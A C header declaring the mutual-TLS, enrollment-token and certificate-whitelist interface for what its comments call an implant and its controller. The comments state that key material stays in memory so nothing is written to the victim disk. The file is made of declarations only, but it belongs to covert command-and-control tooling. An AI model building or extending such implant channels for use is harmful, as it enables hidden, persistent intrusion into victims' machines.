#ifndef TLS_H
#define TLS_H

/*
 * TLS abstraction layer — BP1 (mTLS, TLS 1.3) + BP2 (enrollment) + BP4 (whitelist).
 *
 * Only tls.c includes <openssl/ssl.h>.  All other translation units work
 * through Conn* so that OpenSSL headers are not pulled into every file.
 *
 * BP2 (enrollment-on-first-contact): the implant binary carries only the CA
 * cert + a single-use enrollment token baked in at compile time.  On first
 * run it generates a 2048-bit RSA keypair at runtime (via OpenSSL EVP API,
 * seeded by BCryptGenRandom on Windows), builds a CSR with the token as CN,
 * sends it over one-way TLS to the controller, receives a 30-day signed cert,
 * and then reinitialises to full mTLS.  The private key never touches disk.
 */

typedef struct {
    int   fd;   /* underlying TCP socket file descriptor */
    void *ssl;  /* SSL* — opaque so callers need not include openssl/ssl.h */
} Conn;

/* ── Initialisation (call once before any wrap) ──────────────────────── */

/* Server: load controller cert, key, and CA cert from files on disk.
 * Exits on any error — misconfigured TLS is a fatal startup failure. */
void tls_init_server(const char *cert_file,
                     const char *key_file,
                     const char *ca_file);

/* Client: load CA cert, implant cert, and implant key from in-memory PEM
 * buffers.  Used by the implant so nothing is written to the victim disk. */
void tls_init_client_mem(const char *ca_pem,   int ca_len,
                          const char *cert_pem, int cert_len,
                          const char *key_pem,  int key_len);

/* ── Per-connection wrap ─────────────────────────────────────────────── */

/* Wrap a raw accepted socket with TLS (SSL_accept).
 * Returns heap-allocated Conn* on success, NULL on handshake failure. */
Conn *tls_server_wrap(int fd);

/* Wrap a raw connected socket with TLS (SSL_connect).
 * Returns heap-allocated Conn* on success, NULL on handshake failure. */
Conn *tls_client_wrap(int fd);

/* ── BP4: serial whitelist check ─────────────────────────────────────── */

/* Read the peer certificate's serial number and look it up in whitelist_path
 * (one hex serial per line, case-insensitive).  Returns 1 if found, 0 if
 * not found or if the file cannot be opened.  Pass NULL to skip the check
 * and accept all valid mTLS connections. */
int tls_whitelist_check(Conn *c, const char *whitelist_path);

/* ── BP2: enrollment-on-first-contact ────────────────────────────────── */

/* Client: CA-cert-only context — no client certificate loaded.
 * Used by the implant for the initial enrollment connection. */
void tls_init_client_enroll(const char *ca_pem, int ca_len);

/* Wrap a connected socket with the enrollment TLS context (one-way TLS).
 * Returns heap-allocated Conn* on success, NULL on handshake failure. */
Conn *tls_client_wrap_enroll(int fd);

/* Returns 1 if the peer supplied a client certificate during the handshake.
 * Used by the controller to tell enrollment from normal mTLS connections. */
int tls_has_client_cert(Conn *c);

/* Generate a 2048-bit RSA keypair and a PKCS#10 CSR with CN=token.
 * Writes heap-allocated NUL-terminated PEM strings; caller must free them.
 * Returns 1 on success, 0 on failure. */
int tls_gen_key_and_csr(const char *token,
                         char **key_pem_out, int *key_len_out,
                         char **csr_pem_out, int *csr_len_out);

/* Validate and sign a PEM-encoded CSR using the CA cert + key files.
 * Checks that the CSR's CN equals expected_token and that the self-signature
 * verifies.  Issues an X.509 v3 cert with 30-day validity and a random 64-bit
 * serial, appends the serial (hex) to whitelist_path, and returns the signed
 * cert as a heap-allocated PEM string via cert_pem_out / cert_len_out.
 * Returns 1 on success, 0 on any validation or crypto failure. */
int tls_sign_csr(const char *csr_pem,     int csr_len,
                  const char *ca_cert_file,
                  const char *ca_key_file,
                  const char *expected_token,
                  const char *whitelist_path,
                  char **cert_pem_out, int *cert_len_out);

/* Verify that cert_pem was signed by the CA in ca_pem.
 * Used by the implant to detect PKI rotation before trusting stored creds.
 * Returns 1 if valid, 0 otherwise.  Requires OpenSSL to already be
 * initialised (call after tls_init_client_enroll). */
int tls_cert_signed_by_ca(const char *cert_pem, int cert_len,
                            const char *ca_pem,   int ca_len);

/* ── Teardown ────────────────────────────────────────────────────────── */

/* SSL_shutdown + SSL_free + close(fd) + free(c). */
void tls_conn_free(Conn *c);

/* SSL_CTX_free for the global context(s).  Call once at program exit. */
void tls_cleanup(void);

#endif /* TLS_H */
